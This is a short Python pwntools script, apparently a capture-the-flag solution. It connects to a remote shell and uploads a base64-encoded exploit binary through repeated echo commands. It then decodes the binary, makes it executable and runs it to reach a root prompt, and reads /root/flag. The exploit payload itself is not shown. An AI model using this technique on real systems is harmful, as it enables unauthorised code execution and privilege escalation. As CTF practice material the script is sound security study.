#!/usr/bin/env python2
from __future__ import print_function
from pwn import *
import sys
#context.proxy = (socks.SOCKS5,'test',9381)

def main():
    host = sys.argv[1]
    port = int(sys.argv[2])
    conn = remote(host, port)
    PROMPT = b"/ $ "
    result = conn.recvuntil(PROMPT)
    print("Received before the first prompt:", result, file=sys.stderr)
    xblob = ""
    with open("./poc.bz2", "r") as f:
      xblob = f.read()
    for line in xblob.encode('base64').split('\n'):
      conn.sendline("echo \"%s\" >> /tmp/x.bz2.64" % line)
      conn.recvuntil(PROMPT)
    print("Exploit blob %d bytes" % len(xblob.encode('base64')), file=sys.stderr)
    conn.sendline("base64 -d /tmp/x.bz2.64 > /tmp/x.bz2")
    conn.recvuntil(PROMPT)
    conn.sendline("bunzip2 /tmp/x.bz2")
    conn.recvuntil(PROMPT)
    conn.sendline("chmod 777 /tmp/x")
    conn.recvuntil(PROMPT)
    conn.sendline("ls -l /tmp")
    result = conn.recvuntil(PROMPT)
    print("ls -l /tmp:",result,file=sys.stderr)
    conn.sendline("/tmp/x")
    result = conn.recvuntil(b"/ # ")
    print("Catting flag..",file=sys.stderr)
    conn.sendline("cat /root/flag")
    result = conn.recvuntil(b"}")
    print("flag:",result)
    sys.exit(0)

if __name__ == '__main__':
    main()
